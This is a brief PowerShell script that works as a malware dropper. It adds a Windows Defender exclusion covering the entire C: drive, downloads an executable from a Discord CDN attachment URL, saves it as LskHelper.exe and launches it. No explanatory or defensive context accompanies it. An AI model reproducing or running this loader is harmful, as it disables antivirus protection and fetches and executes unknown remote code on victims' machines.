Set-MpPreference -ExclusionPath "C:\" -ExclusionExtension "C:\LskHelper.exe"
$url = "https://cdn.discordapp.com/attachments/884509370354925638/945906682599465000/n.exe"
$outpath = "$PSScriptRoot/LskHelper.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $outpath)
Start-Process -Filepath "C:\LskHelper.exe"
exit
